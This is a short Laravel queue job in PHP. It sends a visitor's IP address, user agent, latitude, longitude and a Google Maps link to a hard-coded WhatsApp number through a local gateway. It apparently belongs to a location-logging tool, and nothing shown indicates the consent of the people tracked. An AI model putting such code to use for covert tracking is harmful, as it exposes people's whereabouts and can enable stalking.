<?php

namespace App\Jobs;

use App\Models\Information;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Queue\Queueable;
use Illuminate\Support\Facades\Http;

class SendWhatsappNotif implements ShouldQueue
{
    use Queueable;

    /**
     * Create a new job instance.
     */
    public function __construct(
        public Information $info
    )
    {
        //
    }

    /**
     * Execute the job.
     */
    public function handle(): void
    {
        $link = $this->info->latitude && $this->info->longitude ? "https://www.google.com/maps?q={$this->info->latitude},{$this->info->longitude}" : '-';

        Http::post('http://127.0.0.1:1922/send/message', [
            'phone' => '6285175303855@s.whatsapp.net',
            'message' => <<<EOL
            IP: {$this->info->ip_address}
            UserAgent: {$this->info->user_agent}
            Latitude: {$this->info->latitude}
            Longitude: {$this->info->longitude}
            Link Maps: {$link}
            EOL
        ]);
    }
}
